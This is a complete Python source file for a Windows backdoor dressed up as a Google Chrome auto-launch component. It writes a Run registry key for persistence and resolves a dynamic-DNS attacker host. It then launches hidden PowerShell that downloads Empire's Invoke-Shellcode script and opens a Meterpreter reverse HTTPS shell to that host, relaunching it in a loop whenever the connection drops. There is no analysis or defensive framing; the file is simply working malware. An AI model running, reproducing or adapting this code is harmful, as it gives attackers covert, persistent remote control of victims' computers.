import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib

NO_IP_HOST = 'googlechromeauto.serveirc.com'
LHOST = '192.168.1.3'#'googlechromeauto.serveirc.com' #"54.175.188.182"
LPORT = 443
TIME_SLEEP = 10

TEMP_PATH = tempfile.gettempdir()
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "GoogleChromeAutoLaunch_9921366102WEAD21312ESAD31312"
REG_VALUE = '"' + TEMP_PATH + '\GoogleChromeAutoLaunch.exe' + '"' + ' --no-startup-window /prefetch:5'

def set_reg_key_value(REG_PATH, name, value):
    try:
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0,_winreg.KEY_ALL_ACCESS)
        _winreg.SetValueEx(registry_key, name, 0, _winreg.REG_SZ, value)
    except WindowsError:
        pass

def fire():
    if NO_IP_HOST:
        # Check if no-ip is online or not
        check_no_ip_online()

    if platform.machine().endswith('32'):
        try:
            subprocess.Popen("powershell -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
        except WindowsError:
            pass
    else:
        try:
            subprocess.Popen("C:\Windows\System32\WindowsPowerShell\/v1.0\powershell.exe -noprofile -windowstyle hidden -noninteractive -noprofile -windowstyle hidden -noninteractive iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost %s -Lport %s -Force;" % (LHOST,LPORT), shell=True)
        except WindowsError:
            pass

def run_after_close():
    foundIT = False
    runningProcess = []
    for item in os.popen('tasklist').read().splitlines()[4:]:
        runningProcess.append(item.split())
    for item2 in runningProcess:
        if "powershell.exe" in item2:
            foundIT = True

    if not foundIT:
        fire()


def get_noip_ip_address():
    global NO_IP_HOST
    global LHOST
    LHOST = socket.gethostbyname(NO_IP_HOST)


def check_no_ip_online():
    # Check if NoIP is online, If else dont fire
    NO_IP_HTTP = "http://" + NO_IP_HOST
    while True:
        try:
            urllib.urlopen(NO_IP_HTTP).getcode()
        except:
            time.sleep(10)
        else:
            get_noip_ip_address()
            break


# set the reg value in run key
set_reg_key_value(REG_PATH,REG_NAME,REG_VALUE)

# fire the payload
fire()
time.sleep(5)

# keep firing in case of the connection is loss
while True:
    run_after_close()
    time.sleep(TIME_SLEEP)